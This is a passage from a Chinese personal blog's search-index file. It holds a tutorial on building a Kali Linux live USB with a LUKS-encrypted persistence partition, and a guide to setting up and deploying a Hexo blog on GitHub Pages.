Usb。</p><p><code>Linux</code>系统，操作如下：<br><strong>制作Usb启动盘</strong><br>将ios文件放在Linux系统内（位置随意），如果是Linux虚拟机可以用WinSCP上传或共享文件夹传输<br>将镜像刻录到U盘，用unetbootin或命令行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=kali....iso of=/dev/sdb bs=1M # dd: 块复制命令,if: inputfile, of: outputfile, bs: 块大小。</span><br></pre></td></tr></table></figure><p>查看进度，命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch -n 5 killall -USR1 dd # 5：5s, dd: dd命令</span><br></pre></td></tr></table></figure><p><strong>为U盘创建额外分区</strong><br>用磁盘分区工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parted</span><br></pre></td></tr></table></figure><p>列出挂载的磁盘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print devices</span><br></pre></td></tr></table></figure><p>选中sdb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select /dev/sdb</span><br></pre></td></tr></table></figure><p>查看当前sdb的分区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print</span><br></pre></td></tr></table></figure><p>划分sdb分区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkpart primary 3063 7063 # primary: 主分区， 3063：始位置， 7063: 末位置。</span><br></pre></td></tr></table></figure><p><code>Ctrl+C</code>退出parted。</p><p><strong>使用LUKS加密分区</strong>(前端的命令)<br>加密sdb3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cryptsetup --verbose --verify-passphrase luksFormat /dev/sdb3</span><br></pre></td></tr></table></figure><p>输入<code>YES</code> 和 <strong>密码</strong></p><p><strong>打开加密分区</strong><br>打开sdb3,挂在可读分区上，分区命名usb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cryptsetup luksOpen /dev/sdb3 usb</span><br></pre></td></tr></table></figure><p>输入<strong>密码</strong><br>下面是挂载位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /dev/mapper/usb</span><br></pre></td></tr></table></figure><p><strong>格式化加密分区+卷宗</strong><br>文件系统级格式化usb为文件系统格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs ext4 /dev/mapper/usb # mkfs: 文件系统级格式化， ext4: 文件系统格式。</span><br></pre></td></tr></table></figure><p>指定卷标</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e2label /dev/mapper/usb persistence # e2label: 设置卷标， persistence: 官方规定持久卷标</span><br></pre></td></tr></table></figure><p><strong>挂载加密分区，并创建persistence.conf文件</strong><br>新建目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /mnt/usb</span><br></pre></td></tr></table></figure><p>mount到新目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/mapper/usb /mnt/usb/</span><br></pre></td></tr></table></figure><blockquote><p>linux 使用标准，硬件设备mount到一个目录里，访问目录，就是访问设备，进行读写增删改查等操作。</p></blockquote><p>把”/ union”传输给…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/ union&quot; &gt; /mnt/usb/persistence.conf # .conf会被读取，以确认这个分区是加密分区</span><br></pre></td></tr></table></figure><p>挂载卸载掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">umount /dev/mapper/usb</span><br></pre></td></tr></table></figure><p>清除掉加密分区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cryptsetup luksClose /dev/mapper/usb</span><br></pre></td></tr></table></figure><p><strong>通过Usb重启</strong> 选择<code>Live USB Encrypted Persistence</code><br>ok!</p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>my first blog</title>
      <link href="/2018/12/08/My-First-Blog/"/>
      <url>/2018/12/08/My-First-Blog/</url>
      
        <content type="html"><![CDATA[<blockquote><p><code>Hexo + Github</code> 搭建Blog和每次<code>博客</code>的部署</p></blockquote><hr><a id="more"></a><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="安装git-node-js-hexo"><a href="#安装git-node-js-hexo" class="headerlink" title="安装git, node.js, hexo"></a>安装git, node.js, hexo</h3><ul><li>git下载地址：<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">链接</a></li><li>安装后验证</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git --version</span><br></pre></td></tr></table></figure><ul><li>出现类似下面的版本号，皆为成功</li><li>git version 2.19.2.windows.1</li></ul><hr><ul><li>node.js下载地址：<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">链接</a></li><li>安装后验证</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ node -v</span><br></pre></td></tr></table></figure><ul><li><p>出现类似下面的版本号(安装最新版本)：</p></li><li><p>v10.14.1</p></li><li><p>安装Hexo</p></li><li><p>命令行输入(cmd):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure></li><li><p>创建本地仓库文件夹：例F:\mysite</p></li><li><p>右键点击该文件夹，Git Bash Here</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init blog</span><br></pre></td></tr></table></figure></li><li><p>初始化完成！</p></li></ul><h3 id="本地运行"><a href="#本地运行" class="headerlink" title="本地运行"></a>本地运行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> blog</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure><ul><li><p>本地运行(如果4000端口被占用，使用 hexo service -p 5000 修改端口)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></li><li><p>此时在浏览器输入 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> ,访问到博客界面</p></li></ul><h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><h3 id="创建Github账户"><a href="#创建Github账户" class="headerlink" title="创建Github账户"></a>创建Github账户</h3><p>略，随便百度一下</p><h3 id="配置个人信息"><a href="#配置个人信息" class="headerlink" title="配置个人信息"></a>配置个人信息</h3><ul><li><p>在本地，右键网站根目录，点击Git Bash 输入下列命令， yourname 即为github注册时的用户名， youremail 为注册时的邮箱账号， 第三条命令生成密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">"yourname"</span></span><br><span class="line">$ git config --global user.email <span class="string">"yourEmail"</span></span><br><span class="line">$ ssh-keygen -t rsa -C <span class="string">"yourEmail"</span></span><br></pre></td></tr></table></figure></li><li><p>此时在C:\Users下你的当前账户文件夹下会有一个 .ssh 文件，找到id_rsa.pub文件，复制里面的内容，粘贴至GitHub中，点击右上角用户头像下的Settings，之后点击左侧的SSH and GPG keys，找到New SSH key点击，输入title，并将之前复制的内容粘贴到下面的key中，最后点击Add SSH key，完成：</p><h3 id="配置Deployment"><a href="#配置Deployment" class="headerlink" title="配置Deployment"></a>配置Deployment</h3></li><li><p>去博客总目录下的_config.yml文件中，添加如下（yourname就是GitHub的用户名）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: git@github.com:yourname/yourname.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure></li></ul><h2 id="将本地仓库同步到github"><a href="#将本地仓库同步到github" class="headerlink" title="将本地仓库同步到github"></a>将本地仓库同步到github</h2><ul><li><p>在第一次生成以及部署之前，需要安装一个扩展：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></li><li><p>清除生成的静态网页缓存数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure></li><li><p>生成文章对应的静态页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g</span><br></pre></td></tr></table></figure></li><li><p>部署本地站点到github命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
